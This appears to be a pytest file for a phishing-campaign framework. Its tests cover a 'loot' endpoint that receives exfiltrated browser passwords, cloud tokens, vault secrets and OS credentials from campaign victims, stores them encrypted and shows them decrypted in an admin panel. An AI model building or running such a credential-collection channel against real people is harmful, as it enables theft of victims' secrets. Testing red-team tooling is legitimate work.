"""Tests for the loot (credential/secrets) exfiltration channel and UI."""

import json
import os

import pytest

os.environ['DATABASE_URL'] = 'sqlite:///:memory:'

from dropoutjeep import app
from dropoutjeep_lib import db
from dropoutjeep_lib.models import Campaign, Recipient, LootItem, User


@pytest.fixture
def client():
    app.config['TESTING'] = True
    app.config['WTF_CSRF_ENABLED'] = False
    with app.app_context():
        db.create_all()
        yield app.test_client()
        db.session.remove()
        db.drop_all()


def _create_admin(client):
    u = User(username='admin_test', role='admin', is_active=True)
    u.set_password('testpass')
    db.session.add(u)
    db.session.commit()
    client.post('/admin/login', data={'username': 'admin_test', 'password': 'testpass'})
    return u


def _campaign_and_recipient():
    c = Campaign(name='LootTest', subject='s', body_html='b', landing_html='l')
    db.session.add(c)
    db.session.commit()
    r = Recipient(campaign_id=c.id, email='victim@example.com')
    db.session.add(r)
    db.session.commit()
    return c, r


def test_loot_exfil_single_item(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()

    payload = {
        'source': 'browser_chrome',
        'category': 'browser_password',
        'data': {'url': 'https://example.com', 'username': 'alice', 'password': 'secret'},
    }
    resp = client.post(f'/loot/{r.token}', data=json.dumps(payload), content_type='application/json')
    assert resp.status_code == 204

    item = LootItem.query.first()
    assert item is not None
    assert item.campaign_id == c.id
    assert item.recipient_id == r.id
    assert item.source == 'browser_chrome'
    assert item.category == 'browser_password'
    assert item.get_data()['username'] == 'alice'


def test_loot_exfil_list(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()

    payload = [
        {'source': 'aws_cli', 'category': 'cloud_token', 'data': {'key': 'AKIA...'}},
        {'source': 'vault', 'category': 'vault_secret', 'data': {'secret': 'shhh'}},
    ]
    resp = client.post(f'/loot/{r.token}', data=json.dumps(payload), content_type='application/json')
    assert resp.status_code == 204
    assert LootItem.query.count() == 2


def test_loot_exfil_rejects_bad_token(client):
    resp = client.post('/loot/badtoken', data=json.dumps({'source': 'x'}), content_type='application/json')
    assert resp.status_code == 404


def test_loot_exfil_normalizes_unknown_category(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()

    payload = {'source': 'x', 'category': 'not_a_real_category', 'data': {'k': 'v'}}
    resp = client.post(f'/loot/{r.token}', data=json.dumps(payload), content_type='application/json')
    assert resp.status_code == 204
    item = LootItem.query.first()
    assert item.category == 'other'


def test_loot_encryption_roundtrip():
    item = LootItem(source='test', category='other')
    item.set_data({'password': 'supersecret'})
    assert item.data_enc.startswith('enc::')
    assert item.get_data()['password'] == 'supersecret'


def test_admin_loot_index_requires_auth(client):
    resp = client.get('/admin/loot')
    assert resp.status_code == 302


def test_admin_loot_index_lists_items(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()
    item = LootItem(
        campaign_id=c.id,
        recipient_id=r.id,
        recipient_token=r.token,
        source='browser_chrome',
        category='browser_password',
        ip='1.2.3.4',
    )
    item.set_data({'username': 'alice'})
    db.session.add(item)
    db.session.commit()

    resp = client.get('/admin/loot')
    assert resp.status_code == 200
    assert b'browser_password' in resp.data
    assert b'browser_chrome' in resp.data


def test_admin_loot_detail_shows_decrypted_data(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()
    item = LootItem(
        campaign_id=c.id,
        recipient_id=r.id,
        recipient_token=r.token,
        source='os',
        category='os_credential',
    )
    item.set_data({'username': 'admin', 'password': 'hunter2'})
    db.session.add(item)
    db.session.commit()

    resp = client.get(f'/admin/loot/{item.id}')
    assert resp.status_code == 200
    assert b'hunter2' in resp.data


def test_admin_loot_delete(client):
    _create_admin(client)
    c, r = _campaign_and_recipient()
    item = LootItem(campaign_id=c.id, recipient_id=r.id, source='x', category='other')
    item.set_data({'k': 'v'})
    db.session.add(item)
    db.session.commit()

    resp = client.post(f'/admin/loot/{item.id}/delete')
    assert resp.status_code == 302
    assert LootItem.query.get(item.id) is None


def test_admin_campaign_loot_filters_by_campaign(client):
    _create_admin(client)
    c1, r1 = _campaign_and_recipient()
    c2 = Campaign(name='Other', subject='s', body_html='b', landing_html='l')
    db.session.add(c2)
    db.session.commit()
    r2 = Recipient(campaign_id=c2.id, email='other@example.com')
    db.session.add(r2)
    db.session.commit()

    item1 = LootItem(campaign_id=c1.id, recipient_id=r1.id, source='x', category='other')
    item1.set_data({'k': 'v'})
    item2 = LootItem(campaign_id=c2.id, recipient_id=r2.id, source='y', category='other')
    item2.set_data({'k': 'v'})
    db.session.add_all([item1, item2])
    db.session.commit()

    resp = client.get(f'/admin/campaign/{c1.id}/loot')
    assert resp.status_code == 200
    assert b'victim@example.com' in resp.data
    assert b'other@example.com' not in resp.data
